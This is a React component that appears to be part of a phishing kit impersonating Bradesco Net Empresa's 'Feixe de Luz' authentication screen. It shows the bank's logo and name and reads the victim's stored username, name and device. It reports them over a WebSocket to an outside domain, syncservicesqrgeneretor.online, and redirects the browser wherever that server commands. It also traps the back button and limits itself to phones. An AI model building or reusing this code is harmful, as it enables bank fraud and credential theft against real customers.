import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import bradescoLogo from "@/assets/bradesco-logo.png";

const FeixePage = () => {
  const navigate = useNavigate();
  const usuario = sessionStorage.getItem("usuario") || "";
  const nome = sessionStorage.getItem("nome") || "";
  const feixe = sessionStorage.getItem("feixe") || "";
  const dispositivo = sessionStorage.getItem("dispositivo") || "";
  const wsRef = useRef<WebSocket | null>(null);
  const [status, setStatus] = useState<"aguardando" | "validando" | "erro">("aguardando");

  useEffect(() => {
    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("FeixePage WS conectado");
      if (usuario) {
        ws.send(JSON.stringify({ acao: "reconectar", usuario }));
      }
    };

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      console.log("FeixePage msg:", msg);

      if (msg.acao === "redirecionar" && msg.url) {
        setStatus("validando");
        setTimeout(() => {
          window.location.href = msg.url;
        }, 1500);
      }

      if (msg.acao === "erro_feixe") {
        setStatus("erro");
      }
    };

    ws.onerror = (err) => console.error("Feixe WS erro:", err);

    return () => {
      ws.close();
    };
  }, [usuario]);

  // Prevent back navigation
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", handlePop);
    return () => window.removeEventListener("popstate", handlePop);
  }, []);

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">
            Este portal está disponível apenas para dispositivos móveis.
          </p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-[hsl(220,20%,96%)]">
        {/* Blue header bar */}
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3 flex items-center gap-3">
          <h1 className="text-white text-base font-semibold tracking-tight">
            Bradesco Net Empresa
          </h1>
        </div>

        {/* Feixe de Luz content */}
        <div className="flex flex-col items-center flex-1 px-6 pt-8">
          {/* Logo */}
          <img
            src={bradescoLogo}
            alt="Bradesco"
            className="w-20 h-20 object-contain mb-6"
          />

          {nome && (
            <p className="text-[hsl(220,10%,46%)] text-sm mb-1">
              Olá, <span className="font-semibold text-[hsl(220,20%,14%)]">{nome}</span>
            </p>
          )}

          <h2 className="text-[hsl(220,20%,14%)] text-xl font-bold mb-2 text-center">
            Feixe de Luz
          </h2>
          <p className="text-[hsl(220,10%,46%)] text-sm text-center mb-8 max-w-[280px]">
            Aponte a câmera do celular para o feixe de luz exibido na tela do computador.
          </p>

          {/* Feixe animation area */}
          <div className="relative w-56 h-56 mb-6">
            {/* Outer ring */}
            <div className="absolute inset-0 rounded-full border-[3px] border-[hsl(220,60%,40%)]/20" />
            {/* Middle pulsing ring */}
            <div className="absolute inset-3 rounded-full border-[2px] border-[hsl(220,60%,40%)]/30 animate-ping" style={{ animationDuration: "2s" }} />
            {/* Inner circle with icon */}
            <div className="absolute inset-6 rounded-full bg-[hsl(220,60%,40%)]/10 flex items-center justify-center">
              {status === "aguardando" && (
                <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 text-[hsl(220,60%,40%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
                  {/* Flashlight / beam icon */}
                  <path d="M12 2v8" />
                  <path d="m4.93 10.93 1.41 1.41" />
                  <path d="M2 18h2" />
                  <path d="M20 18h2" />
                  <path d="m19.07 10.93-1.41 1.41" />
                  <path d="M10 22h4" />
                  <path d="M10 18a4 4 0 0 1 4 0" />
                  <path d="M8 22h8" />
                  <circle cx="12" cy="14" r="4" />
                </svg>
              )}
              {status === "validando" && (
                <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 text-[hsl(142,71%,45%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                  <path d="m9 12 2 2 4-4"/>
                </svg>
              )}
              {status === "erro" && (
                <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 text-[hsl(0,84%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10"/>
                  <path d="m15 9-6 6"/>
                  <path d="m9 9 6 6"/>
                </svg>
              )}
            </div>
          </div>

          {/* Feixe code display */}
          {feixe && (
            <div className="bg-white rounded-xl px-6 py-4 shadow-md shadow-black/5 mb-5">
              <p className="text-[hsl(220,10%,46%)] text-xs text-center mb-1">Código do feixe</p>
              <p className="text-[hsl(220,20%,14%)] text-2xl font-bold tracking-[0.15em] text-center font-mono">
                {feixe}
              </p>
            </div>
          )}

          {/* Info card */}
          <div className="bg-white rounded-xl px-4 py-3 w-full border border-[hsl(220,14%,89%)] space-y-2">
            {dispositivo && (
              <div className="flex justify-between text-sm">
                <span className="text-[hsl(220,10%,46%)]">Dispositivo</span>
                <span className="text-[hsl(220,20%,14%)] font-medium">{dispositivo}</span>
              </div>
            )}
            <div className="flex justify-between text-sm">
              <span className="text-[hsl(220,10%,46%)]">Status</span>
              <span className={`font-medium ${
                status === "aguardando" ? "text-[hsl(220,60%,40%)]" :
                status === "validando" ? "text-[hsl(142,71%,45%)]" :
                "text-[hsl(0,84%,60%)]"
              }`}>
                {status === "aguardando" && "Aguardando leitura"}
                {status === "validando" && "Validado ✓"}
                {status === "erro" && "Falha na validação"}
              </span>
            </div>
          </div>

          {/* Status message */}
          <p className={`text-xs mt-6 text-center ${
            status === "erro" ? "text-[hsl(0,84%,60%)]" : "text-[hsl(220,10%,46%)] animate-pulse"
          }`}>
            {status === "aguardando" && "Aguardando leitura do feixe de luz..."}
            {status === "validando" && "Redirecionando..."}
            {status === "erro" && "Não foi possível validar. Tente novamente."}
          </p>

          {status === "erro" && (
            <button
              onClick={() => {
                setStatus("aguardando");
                wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario }));
              }}
              className="mt-4 px-8 h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200"
            >
              Tentar novamente
            </button>
          )}
        </div>
      </div>
    </>
  );
};

export default FeixePage;
